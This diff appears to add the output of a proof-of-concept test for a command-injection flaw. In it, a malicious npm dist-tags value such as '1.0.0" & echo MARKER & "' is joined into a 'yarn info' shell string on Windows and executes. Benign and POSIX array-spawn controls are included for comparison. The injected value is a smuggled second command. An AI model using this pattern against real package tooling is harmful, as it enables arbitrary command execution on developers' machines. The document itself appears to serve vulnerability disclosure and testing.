@@ -1,0 +1,24 @@
+=== CASE A: win32 shape, malicious dist-tags VALUE (the W1 injection) ===
+malicious dist-tags value: "1.0.0\" & echo W1-POC-MARKER-4f7c2a & \""
+[win32 host] joined shell:string -> "yarn info --json --verbose \"attacker-pkg@1.0.0\" & echo W1-POC-MARKER-4f7c2a & \"\""
+[win32 host] shell output (first 300 chars):
+W1-POC-MARKER-4f7c2a
+/bin/sh: : command not found
+stub-yarn-run: info --json --verbose attacker-pkg@1.0.0
+
+[win32 host] INJECTED MARKER EXECUTED (standalone line): YES
+
+=== CASE B (control): win32 shape, benign value ===
+[win32 host] joined shell:string -> "yarn info --json --verbose \"attacker-pkg@1.0.0\""
+[win32 host] shell output (first 300 chars):
+stub-yarn-run: info --json --verbose attacker-pkg@1.0.0
+
+[win32 host] INJECTED MARKER EXECUTED (standalone line): NO
+
+=== CASE C (negative control): POSIX shape (array spawn) with the SAME malicious value ===
+[posix host] array spawn: yarn ["info","--json","--verbose","attacker-pkg@1.0.0\" & echo W1-POC-MARKER-4f7c2a & \""]
+[posix host] INJECTED MARKER EXECUTED (standalone line): NO (expect NO — literal arg, marker text only appears inside the echoed arg)
+
+=== cmd.exe equivalence note ===
+The joined shell:string is passed to cmd.exe /c on win32 (shell:true, host.ts:157-164).
+`&` is the command separator in BOTH cmd.exe and POSIX sh; the same split shape applies.
